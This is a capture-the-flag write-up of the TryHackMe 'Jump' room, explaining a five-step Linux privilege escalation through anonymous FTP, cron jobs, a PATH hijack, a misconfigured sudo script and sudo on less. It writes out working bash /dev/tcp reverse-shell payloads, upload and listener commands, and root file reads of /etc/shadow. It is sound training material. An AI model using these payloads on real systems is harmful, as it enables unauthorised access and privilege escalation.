---
description: "TryHackMe Jump — a box with two open ports and an automation pipeline where every stage trusts the one before it. Anonymous FTP feeds a cron job that runs whatever you upload; group membership lets you rewrite another user's scheduled script; owning a file (not merely being able to write it) is what lets you set the execute bit on a pre-staged PATH hijack; a privileged script runs a helper owned by its unprivileged caller; and sudo on a pager reads root's files. Five users, five trust boundaries. Includes the hour lost to a firewall on my own machine, and the packet capture that proved the exploit had been working the whole time."
---

# Jump — five users, five broken trust boundaries

**TryHackMe · challenge: Jump · target: `10.x.x.x` (the lab IP changes every time you start the box)**

> **All five flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every
> command with every flag explained, the real output, the controls that prove each result, the exact
> payloads, all five wrong turns, and the teardown. The flag strings themselves teach nothing — they
> are just proof you were there, and publishing them hands the room's answer to the next person
> instead of letting them earn it.
>
> **What I kept and why:** the usernames (`recon_user`, `dev_user`, `monitor_user`, `ops_user`), the
> paths (`/srv/ftp/incoming`, `/opt/dev/backup.sh`, `/opt/dev/bin/ps`, `/opt/app/deploy_helper.sh`,
> `/usr/local/bin/deploy.sh`), the cron lines, the systemd unit, the sudo rules and the full payloads
> are *method*, not prize. Redacting them would leave a write-up that teaches nothing. Only the five
> `THM{...}` values are removed.

**The brief:** a misconfigured internal automation pipeline. It processes recon scripts, development
backups, monitoring jobs and deployment tasks across several users. *Each stage of the pipeline
relies too heavily on the previous one.* Abuse those trust boundaries and walk up the chain:

```
anonymous → recon_user → dev_user → monitor_user → ops_user → root
```

That sentence in the brief is the whole box. Not one of these five steps is a memory-corruption
exploit or a clever trick. Every single one is a person wiring two components together and assuming
the component upstream is trustworthy. That is what makes this box worth doing carefully — it is
what real Linux privilege escalation actually looks like most of the time.

---

## Vocabulary first, because the room assumes none

If you already know this, skip to the recon. Nothing below is optional if you don't.

A **port** is a numbered door on a machine. Each program that accepts network connections waits
behind one. Port 21 is traditionally FTP, port 22 is SSH. A machine with two open ports is offering
you exactly two ways to start a conversation.

**FTP** (*File Transfer Protocol*) is an old protocol for copying files over a network. **Anonymous
FTP** means the server accepts the literal username `anonymous` with any password at all. That is a
deliberate feature for public file downloads — and a serious problem when the folder you can write
into is also being read by an automated job.

**SSH** (*Secure Shell*) is the normal way to get a text command line on a remote Linux machine.

A **shell** is that command line: a program that reads commands you type and runs them.

A **reverse shell** is a shell that runs on the *target* machine but sends its screen output to
*your* machine and takes its keyboard input from you, over a network connection. It is called
*reverse* because the target dials out to you, rather than you connecting in. That direction matters
enormously: most firewalls block connections coming *in* to a machine but happily allow connections
going *out* of it.

A **listener** is the program on your side that waits for that call. Usually `nc` (netcat).

**cron** is the Linux job scheduler. Each user can have a **crontab** — a list of commands and the
times to run them. `* * * * * /bin/bash /opt/dev/backup.sh` means "run that command every minute".
Crucially, a cron job runs **as the user who owns that crontab**. If you can change what a command
does, and someone else's cron runs it, your code runs as them. That single sentence is two of this
box's five stages.

**Users, groups and permissions.** Every file has an **owner** and a **group**, and grants three
separate sets of permissions: to the owner, to members of the group, and to everyone else. `ls -la`
shows them as nine characters:

```
-rwxrwxr-x 1 dev_user dev_user 60 backup.sh
 |__||__||__|
  |   |   └── everyone else: read, no write, execute
  |   └────── the group (dev_user): read, WRITE, execute
  └────────── the owner (dev_user): read, write, execute
```

`r` = read, `w` = write, `x` = execute, `-` = not allowed. A user can be a member of several groups,
so if you are in the `dev_user` group, the middle block is *your* permission set on this file.

**PATH** is a list of directories the shell searches when you type a command name without giving its
full location. Type `ps` and the shell looks in each PATH directory in order, **left to right, and
stops at the first match**. If an attacker controls a directory that appears earlier in PATH than
the real one, they choose what `ps` means.

**systemd** is what starts and supervises background services on modern Linux. A **service unit**
file describes one: which program to run, which user to run it as, and what environment (including
PATH) to give it.

**sudo** runs a command as another user. An administrator can grant narrow permissions — "this user
may run exactly this one program as root, without a password". `sudo -l` lists what you're allowed.

**GTFOBins** is a public catalogue of ordinary Unix programs that can be turned into privilege
escalation when they're allowed to run with elevated rights. If `sudo -l` names a program, look it
up there first.

---

## Recon — what is even open

Always start by asking what the machine is offering. **nmap** is the standard port scanner.

```bash
nmap -p- -T4 --min-rate 1000 -oN nmap-allports.txt 10.x.x.x
```

- `-p-` — scan **all 65535 ports**, not just nmap's default top 1000. Slower, but a service hiding
  on an unusual port is exactly the kind of thing a default scan misses.
- `-T4` — timing template 4, "aggressive". Speeds the scan up. On a small lab VM don't go past this;
  `-T5` can overwhelm the box and then you are debugging your own traffic instead of the target.
- `--min-rate 1000` — send at least 1000 packets per second, so the full-port sweep finishes in
  minutes rather than hours.
- `-oN file` — write **n**ormal-format output to a file. Always save your scans. You will want to
  re-read them later, and re-scanning wastes time and hammers the box.

Then ask what the open ports actually *are*:

```bash
nmap -sC -sV -p21,22 -oN nmap-scripts.txt 10.x.x.x
```

- `-sV` — **version detection**. Talks to each port and figures out the software and version.
- `-sC` — run nmap's **default script set**: safe, non-intrusive checks. One of them, `ftp-anon`,
  tests anonymous FTP login for you, which is exactly what we want here.
- `-p21,22` — only the ports we already know are open. No point re-scanning 65535 of them.

The result, and it is a short list:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 9.6p1 |

No web server. That matters: it removes a whole category of guesses. We have no credentials, so SSH
is a locked door. **Everything must start at FTP.**

`ftp-anon` reports the important part: anonymous login is allowed.

---

## FTP — read what is there before touching anything

```bash
ftp 10.x.x.x
# username: anonymous, password: anything
```

The directory tree:

```
/
├── incoming/     drwxrwxrwx   world-writable, empty
└── pub/
    ├── README.txt
    ├── archive/  drwxr-xr-x
    └── uploads/  drwxrwxrwx   world-writable, empty
```

`drwxrwxrwx` — the leading `d` means directory, and all three permission blocks show `w`. **Anyone
can write here**, including anonymous.

And `pub/README.txt` explains the pipeline out loud:

```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

"Processed automatically" means a program reads this directory on a schedule and does something with
what it finds. That program runs as *some user*. If we can influence what it does, we run code as
that user. This is the first trust boundary: **the pipeline trusts that anything appearing in
`incoming/` was put there by someone who was allowed to.** Anonymous FTP means that assumption is
false.

Upload a reverse shell named so it looks like a recon job:

```bash
cat > recon.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<your-vpn-ip>/4444 0>&1
EOF

curl -T recon.sh ftp://10.x.x.x/incoming/ --user anonymous:anonymous
```

- `cat > file << 'EOF'` — a **heredoc**: write everything up to the line `EOF` into that file. The
  quotes around `'EOF'` matter — they stop the shell from expanding `$` and backticks, so the payload
  lands as literal text.
- `bash -i` — an **interactive** shell (it prints a prompt and behaves like a terminal).
- `>& /dev/tcp/IP/PORT` — bash offers a special fake file that is really a network connection.
  Writing to it sends data to that address. `>&` sends *both* normal output and error messages there.
- `0>&1` — also take input (stream 0) from that same connection, so what you type arrives at the
  shell. Put together: a shell whose screen and keyboard are a network socket.
- `curl -T file ftp://...` — `-T` means **upload** (transfer) this file to that location.

And start a listener before you upload, so the call has somewhere to land:

```bash
nc -lvnp 4444
```

- `-l` — **listen** for an incoming connection instead of making one.
- `-v` — **verbose**, so it tells you when something connects.
- `-n` — no DNS lookups. Faster and avoids hangs.
- `-p 4444` — listen on port 4444.

Then wait.

---

## The hour I lost, and the check that ended it

Nothing happened.

Not "nothing yet" — nothing for a long time. The uploaded files sat in `incoming/` untouched. Nothing
appeared in `archive/`. Nothing was deleted. The listener printed its startup banner and never
another line. I uploaded ten different payloads in six different formats, in case the pipeline only
accepted certain filenames. Silence. I ran a fifteen-minute soak test in case the schedule was slow.
Silence. I scanned UDP ports in case the real service was elsewhere. Nothing there either.

So I concluded the pipeline was not running, and started looking for a different way in.

**That conclusion was wrong, and it was wrong in an interesting way.** The exploit had been working
the entire time. `recon.sh` was executing every sixty seconds. It had been for over an hour.

Here is the reasoning error, and it is worth more than any command in this write-up:

> A listener that reports nothing does not tell you the target did nothing.
> It tells you **nothing reached the listener**.

Those are different claims. Between "the target sent nothing" and "I received nothing" sits every
piece of network equipment in between — including **the firewall on my own attacking machine**. Kali
Linux ships `ufw` (the standard Linux firewall) configured to **drop incoming connections by
default**. The target was calling. My own laptop was hanging up on it, silently, before `nc` ever
heard the phone ring.

`nc` could never have told me this, because `nc` sits *above* the firewall. To see the truth you have
to look *below* it, at the raw packets arriving on the network card. That is what **tcpdump** does:

```bash
sudo tcpdump -i tun0 -nn "host 10.x.x.x and tcp port 5555" -c 20 -w capture.pcap
```

- `-i tun0` — capture on the **VPN interface**. `tun0` is the virtual network card your VPN client
  creates; all traffic to and from the lab travels through it.
- `-nn` — do not convert IP addresses into names or port numbers into service names. Faster, and it
  shows you the raw numbers you actually want to compare.
- `"host ... and tcp port ..."` — a **capture filter**, so you only see packets involving that
  machine on that port. Without one you drown in unrelated traffic.
- `-c 20` — stop after 20 packets so the command ends by itself.
- `-w capture.pcap` — save the raw packets to a file, so the evidence survives the terminal.

The output settled it in seconds:

```
23:05:04 IP 10.x.x.x.57584 > 192.168.160.167.5555: Flags [S], seq 450363772
23:05:05 IP 10.x.x.x.57584 > 192.168.160.167.5555: Flags [S], seq 450363772
23:05:06 IP 10.x.x.x.57584 > 192.168.160.167.5555: Flags [S], seq 450363772
...
23:06:02 IP 10.x.x.x.41320 > 192.168.160.167.5555: Flags [S], seq 350260226
```

Read that carefully, because it says three things at once:

- **`Flags [S]`** is a **SYN** packet — the opening message of a TCP connection. A machine saying
  "I would like to talk to you." The target was calling us.
- **The same packet repeats** at 1-second, then 2-, then 4-second intervals. That is TCP's automatic
  retry behaviour when nobody answers. Seven or eight retries per attempt.
- **The source port changes each minute** — `57584` at 23:05, `41320` at 23:06. Each minute is a
  *brand new* connection attempt. That is a scheduled job firing on a timer.

And crucially: **not one SYN-ACK went back.** No reply. The packets arrived at my network card and
were thrown away by my own firewall.

Those blocked packets were never a symptom of failure. **They were the proof of success** — visible
from the very first minute, in a place I hadn't looked.

The fix, scoped to the VPN interface only so nothing else on the machine is exposed:

```bash
sudo ufw allow in on tun0
```

- `allow in` — permit incoming connections...
- `on tun0` — ...but only arriving on the VPN interface. Your home network stays untouched.

The shell landed twenty seconds later. Remove the rule when you are finished:
`sudo ufw delete allow in on tun0`.

**The habit to build:** when a reverse shell does not call back, do not start re-theorising the
target. Capture packets on the interface first. It costs one command and it tells you which side of
the wire the problem is on. I had written this exact lesson down after a previous box — and did not
run it. A checklist you *recall* is not a checklist you *ran*.

---

## Stage 1 — anonymous → recon_user

With the firewall open, the listener catches the call:

```
connect to [192.168.160.167] from (UNKNOWN) [10.x.x.x] 57406
recon_user@tryhackme-2404:~$
```

First flag:

```bash
cat /home/recon_user/flag.txt
# THM{[redacted]}
```

Now find out *why* this worked, because the mechanism is the next stage's map:

```bash
crontab -l
```

- `crontab -l` — **list** the current user's scheduled jobs.

```
* * * * * /bin/bash /opt/recon/scan_uploads.sh
```

Five stars mean minute, hour, day-of-month, month, day-of-week, each set to "any" — so: **every
minute**. And the script it runs:

```bash
#!/bin/bash
shopt -s nullglob
for f in /srv/ftp/incoming/*.sh; do
  /bin/bash "$f" &
  sleep 5
 # rm -f "$f"
done
```

There it is. `/srv/ftp/incoming/` is the same directory anonymous FTP exposes as `incoming/`. Every
file ending in `.sh` is handed to `/bin/bash` — **executed, as recon_user, every minute**. Only `.sh`
files, which is why my earlier `.txt` and `.nmap` payload variants were correctly ignored.

Note the commented-out `rm -f "$f"`. Cleanup is disabled, so uploaded payloads are never removed and
re-fire every minute forever. That explains the endless stream of SYN packets in the capture — and it
is also a mess you are responsible for cleaning up afterwards. More on that in the teardown.

---

## Stage 2 — recon_user → dev_user

Whenever you land as a new user, run `id` first. Here it is the entire vulnerability in one line:

```bash
id
```

```
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

recon_user is **a member of the `dev_user` group**. So for any file owned by dev_user, recon_user
gets the *group* permission block. Go looking for dev_user's files:

```bash
ls -la /opt/dev/
```

```
-rwxrwxr-x 1 dev_user dev_user  60 backup.sh
drwxr-xr-x 2 dev_user dev_user      bin/
```

`backup.sh` is `-rwxrwxr-x`. Middle block: `rwx`. **The dev_user group can write to it, and we are in
that group.** Its contents:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Before touching it, prove it actually runs — otherwise you are editing a file nothing executes, which
is exactly the trap I fell into for an hour earlier. The script writes `/tmp/recon_backup.tgz`, so
that file's timestamp is a log of when the script last ran:

```bash
stat /tmp/recon_backup.tgz
date
```

- `stat file` — show a file's full metadata: size, owner, permissions, and its three timestamps.

```
Modify: 2026-09-03 20:54:01
Thu Sep  3 20:54:01 UTC 2026
```

Identical to the second. It had *just* fired, and the file is owned by `dev_user` — so dev_user runs
it, on a schedule, right now. That is the positive control. **Never build on "it probably runs".**

Overwrite the contents, keeping the original `tar` line so the box's real job still works:

```bash
cat > /opt/dev/backup.sh << 'EOF'
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
(bash -i >& /dev/tcp/<your-vpn-ip>/5555 0>&1 &)
EOF
```

The `( ... &)` wrapper runs the shell **detached in the background**, so the cron job finishes
immediately instead of hanging for as long as your shell stays open. A cron job that never exits will
pile up a new copy every minute and eventually get noticed.

Why does this work when we don't own the file? Because `>` **truncates and rewrites a file's
contents without changing its ownership or its permissions**. The file stays `dev_user:dev_user`, and
stays executable. Group-write alone is enough.

Within sixty seconds, a shell as dev_user. Second flag:

```bash
cat /home/dev_user/flag.txt
# THM{[redacted]}
```

**A small honesty note:** `/home/dev_user/flag.txt` is mode `644` — readable by *everyone* on the
box. So that flag was already readable from the recon_user shell, before this pivot landed. The pivot
is still necessary, but for **access**, not for this flag — as the next stage shows, only dev_user
can do the one thing that opens the door to monitor_user.

---

## Stage 3 — dev_user → monitor_user (a PATH hijack, pre-staged)

Look at the other thing in `/opt/dev/`:

```bash
ls -la /opt/dev/bin/
cat /opt/dev/bin/ps
```

```
-rw-rw-r-- 1 dev_user dev_user 62 ps
```
```bash
#!/bin/bash
setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1
```

A file named `ps` that is not the real `ps` — it is a reverse shell, aimed at an address from the
box's own build process (not yours; ignore it). And note the permissions: `-rw-rw-r--`. **No `x`
anywhere.** It is not executable. That is what keeps it harmless.

Why would a fake `ps` matter? Because of this systemd service:

```bash
cat /etc/systemd/system/healthcheck.service
```

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

- `User=monitor_user` — this service runs as monitor_user.
- `Environment=PATH=/opt/dev/bin:...` — and it searches **`/opt/dev/bin` first**, before `/usr/bin`
  where the real `ps` lives.

And the program it runs:

```bash
cat /usr/local/bin/healthcheck
```

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

It calls **`ps` by bare name**, in an infinite loop, every five seconds. (`ps` lists running
processes; `aux` is the conventional flag set meaning "all processes, with their owners, including
ones not attached to a terminal".)

So: whoever controls `/opt/dev/bin/ps` controls a command that monitor_user executes every five
seconds. All that is missing is the execute bit.

**And here is the exact reason this stage is separate from the last one.** As recon_user:

```bash
chmod +x /opt/dev/bin/ps
# chmod: changing permissions of '/opt/dev/bin/ps': Operation not permitted
```

Group-write lets you change a file's **contents**. Only the file's **owner** (or root) may change its
**permissions**. recon_user could rewrite the file all day and it would still never execute. dev_user
owns it. That distinction — write versus own — *is* the trust boundary, and it is a genuinely useful
thing to have burned into your memory.

As dev_user, retarget it and arm it:

```bash
cat > /opt/dev/bin/ps << 'EOF'
#!/bin/bash
setsid bash -c 'bash -i >& /dev/tcp/<your-vpn-ip>/5556 0>&1' &
/usr/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

- `setsid` — start the shell in a new session, detached from the service, so it survives.
- `&` — background it, so the healthcheck loop is not blocked.
- **`/usr/bin/ps "$@"`** — then call the *real* `ps` at its full path and pass along whatever
  arguments were given (`"$@"` means "all the original arguments"). This is the part people skip.
  Without it the monitoring service stops producing output and visibly breaks. With it, everything
  looks completely normal while your payload runs alongside.
- `chmod +x` — **add the execute permission**. The one thing recon_user could not do.

Under five seconds later: a shell as monitor_user. Third flag:

```bash
cat /home/monitor_user/flag.txt
# THM{[redacted]}
```

**A prediction I got wrong, kept in because being wrong here is instructive.** I expected this to
fail. Bash remembers ("hashes") where it found a command so it doesn't re-search PATH every time, and
that service had been running since boot — so I assumed it had long since cached `ps` as
`/usr/bin/ps` and would ignore our file. It worked anyway. The reason: `ps aux | grep -v grep` is a
**pipeline**, and bash forks a fresh subshell for each side of a pipe. Each subshell does its own
fresh PATH lookup, so the cache never applied. A plausible mechanism for why an attack *won't* work
is a hypothesis, not a result. Try it, then explain it.

---

## Stage 4 — monitor_user → ops_user

New user, so run the two standard questions again: `id`, then what sudo allows.

```bash
sudo -n -l
```

- `-l` — **list** the sudo permissions for the current user.
- `-n` — **non-interactive**: never prompt for a password, just fail if one is needed. Use this
  habitually in a reverse shell, where an invisible password prompt will silently hang your session.

```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`(ops_user)` is who we may become. `NOPASSWD` means no password needed. On its own that is fine —
it's one specific script. The problem is what the script does:

```bash
cat /usr/local/bin/deploy.sh
```

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

It runs a second script. Who owns that one?

```bash
ls -la /opt/app/deploy_helper.sh
```

```
-rwxr-xr-x 1 monitor_user monitor_user 90 deploy_helper.sh
```

**Owned by monitor_user — us.** A script running as ops_user executes a file controlled by the very
user who isn't supposed to be ops_user. There is no exploit to write. Just edit the file and trigger
the sudo rule:

```bash
cat > /opt/app/deploy_helper.sh << 'EOF'
#!/bin/bash
id
cat /home/ops_user/flag.txt
sudo -n -l
EOF
chmod +x /opt/app/deploy_helper.sh

sudo -n -u ops_user /usr/local/bin/deploy.sh
```

- `-u ops_user` — run it as that user, exactly as the sudo rule permits.

```
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
THM{[redacted]}
```

Fourth flag. **Notice there is no reverse shell in this stage.** `sudo` runs the command and hands
you its output directly, so the script's own `echo` and `cat` output *is* the channel. Fewer moving
parts, nothing left listening, nothing to clean up. Reach for a reverse shell when you need an
interactive session — not reflexively.

---

## Stage 5 — ops_user → root, and where the textbook answer fails

The same question, one level up. Our `deploy_helper.sh` already asked it:

```
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

`less` is a **pager** — a program for reading a file one screenful at a time. It's a well-known
GTFOBins entry, and the classic trick is simple: inside `less`, type `!sh` and it launches a shell.
Running as root, that is a root shell.

**On this box, that does not work.** Four variants, every one silently doing nothing:

| # | Attempt | Result |
|---|---|---|
| A | `sudo less +'!id > /tmp/rootproof' -EF /etc/hostname` | no file created |
| B | `LESS='+!id > /tmp/rootproof2' sudo less -EF /etc/hostname` | no file created |
| C | `echo '!id > /tmp/rootproof3' \| sudo less /etc/hostname` | no file created |
| D | `echo MARKER \| sudo less -O/tmp/lesswrite -EF -` | no file created |

`less` here is version 590 running in **secure mode**, which disables the shell escape (`!`), the
pipe command (`|`), the editor launch (`v`), and the `-o` log-file option. Variant D was an attempt
to turn root file-*read* into root file-*write* using `-o` (which copies piped input into a file);
that is disabled too.

**The important detail is that none of them printed an error.** They are ignored in silence, and all
four commands exited successfully. If I had judged them by exit status I would have believed all four
worked. The only reason I knew they hadn't is that each attempt wrote a **proof file** and then
checked whether it existed. When you try a shell escape, always make it produce an artefact you can
go and look for.

What secure mode does **not** disable is the thing `less` exists to do: read a file. As root.

```bash
sudo -n /usr/bin/less -EF /root/flag.txt
```

- `-E` — quit automatically at end of file.
- `-F` — quit immediately if the content fits on one screen.

Both flags are required here, and it's worth knowing why. This system's sudo is configured with
`use_pty`, which gives the command a pseudo-terminal. Without `-E`/`-F`, `less` therefore decides it
is interactive, starts paging, and **hangs your reverse shell** waiting for a keypress it can never
receive.

Fifth flag:

```
THM{[redacted]}
```

**Being straight about what this is:** an interactive root shell was never obtained on this box.
What was obtained is arbitrary file read *as root*, which is what produces the final flag. Those are
not the same thing, and it is worth saying so rather than writing "rooted" and moving on.

For completeness, the same primitive answers whether a better path was hiding:

```bash
sudo -n /usr/bin/less -EF /etc/shadow
```

```
root:*:18561:0:99999:7:::
```

`/etc/shadow` stores password hashes. The second field is the hash — and root's is a bare `*`, which
means **the password is disabled**. There is no hash, so there is nothing to crack. There's no
`/root/.ssh/id_rsa` either. Had I gone hunting for a root password, I'd have spent hours attacking
something that does not exist. Read `/etc/shadow` before you ever consider cracking.

---

## The pattern, in one table

Strip away the specifics and the same mistake appears five times:

| Stage | The trust that was misplaced |
|---|---|
| anon → recon_user | A scheduled job assumed files in a directory were placed there by someone authorised. Anonymous FTP wrote to it. |
| recon_user → dev_user | A scheduled script was left **group-writable**, and another user was in that group. |
| dev_user → monitor_user | A service put a **user-writable directory first in its PATH** and called a command by bare name. |
| monitor_user → ops_user | A privileged script executed a **helper owned by its unprivileged caller**. |
| ops_user → root | A sudo rule granted a **file-reading tool** to a user, and root's secrets are files. |

None of these need a memory-corruption bug or a CVE. When you land on a Linux box, this is the list
to work through: `id` for group memberships, `crontab -l` and `/etc/cron*` for scheduled jobs,
`sudo -l` for granted permissions, `systemctl cat` for service environments, and `find` for files
you can write that someone else runs.

---

## Wrong turns, all of them

**1. Concluding the pipeline was dead while it was working.** Six minutes of silence across ten
payloads, an empty `archive/`, and a quiet listener were read as "no processor is running". All three
signals are equally consistent with a working exploit whose callback is being dropped by your own
firewall. The instrument (`nc`) sat above the thing doing the blocking, so it *could not* have
detected the difference. **Rule:** when a callback doesn't arrive, packet-capture the interface
before revising your theory of the target.

**2. Killing a working shell to free a port.** With the recon_user shell live on port 4444 and 5555
apparently blocked, I decided to reuse 4444 — and killed the listener, destroying my only foothold.
Seconds later the real cause turned out to be the firewall; the port was never the problem.
**Rule:** never destroy a working foothold to work around a symptom you have not diagnosed.

**3. Deleting a FIFO that `nc` still held open.** I drove these shells through a **named pipe**
(a FIFO — a file that acts as a channel between two programs) so I could send commands into the
listener. During cleanup I deleted it while `nc` was still using it. `nc` kept the now-unnamed
channel as its input, so every later `echo > /tmp/rp5555` quietly created a *brand new ordinary file*
at that path and vanished into it. Commands sent, no output, connection perfectly healthy. Diagnosed
by reading `/proc/<pid>/fd/`, which lists exactly which files a process has open:

```bash
ls -la /proc/<pid>/fd/
# 0 -> /tmp/rp5555 (deleted)
```

That `(deleted)` is the whole answer. Writing to `/proc/<pid>/fd/0` reaches the original channel and
recovered the session. **Rule:** a path is not a file. When a process ignores input it should be
receiving, look at `/proc/<pid>/fd/`.

**4. A listener that never started.** `nc -lvnp 5555 < /tmp/rp5555 &` silently failed to run at all.
Opening a FIFO for *reading* blocks until some other program opens it for writing — and the shell
performs that redirection **before** it starts `nc`. So the shell sat waiting and `nc` never
launched, while the target was dialling a port with nothing behind it. Using `<>` (read-write) instead
never blocks. **Rule:** verify a backgrounded listener actually exists (`ps`, `ss -ltn`). "The command
returned" is not "the program is running".

**5. Assuming bash's command hash would defeat the PATH hijack.** Covered above — predicted failure,
worked fine, because pipelines fork subshells that re-resolve PATH.

---

## Teardown — put the box back

This matters more than it sounds, and on a shared lab box it matters a lot. Working through this
challenge means **you** planted a reverse shell that fires every minute and **you** set the execute
bit on a privilege-escalation payload. Leave those behind and the next person inherits a machine that
is more broken than the one you were given — broken by you, not by the room's author.

| What you changed | Put it back to |
|---|---|
| `/opt/dev/backup.sh` | the original `tar` one-liner, mode 775 |
| `/opt/dev/bin/ps` | the original text, mode 664 — **non-executable again** |
| `/opt/app/deploy_helper.sh` | the original 4-line helper, mode 755 |
| every file you uploaded to `incoming/` | deleted — especially `recon.sh`, which re-fires every minute |
| your listeners | killed by PID |
| `sudo ufw allow in on tun0` | `sudo ufw delete allow in on tun0` |

Restoring `/opt/dev/bin/ps` to **non-executable** is the critical one. Leaving that execute bit set
leaves a working, trivially-triggered escalation to monitor_user sitting on the box.

And verify each removal by **re-reading the file**, not by trusting that the command exited without
complaining. Compare the byte count against what you recorded before you changed anything — mine came
back at 60, 62 and 90 bytes, matching the originals exactly. `rm` and `pkill` both fail quietly in
ways that make you believe you cleaned up when you didn't.

---

## Answers

| # | User | How it was obtained | Flag |
|---|---|---|---|
| 1 | recon_user | `.sh` upload to anonymous FTP `incoming/`, executed by recon_user's cron | `THM{[redacted]}` |
| 2 | dev_user | `/home/dev_user/flag.txt` is mode 644 — world-readable | `THM{[redacted]}` |
| 3 | monitor_user | PATH hijack of `ps` against `healthcheck.service` | `THM{[redacted]}` |
| 4 | ops_user | rewrote `deploy_helper.sh`, invoked via the NOPASSWD `deploy.sh` | `THM{[redacted]}` |
| 5 | root | `sudo -n /usr/bin/less -EF /root/flag.txt` | `THM{[redacted]}` |

If you take one thing from this box, make it the hour I lost: **silence is not evidence.** Before you
conclude a target isn't doing something, prove your own machine would have noticed if it were.
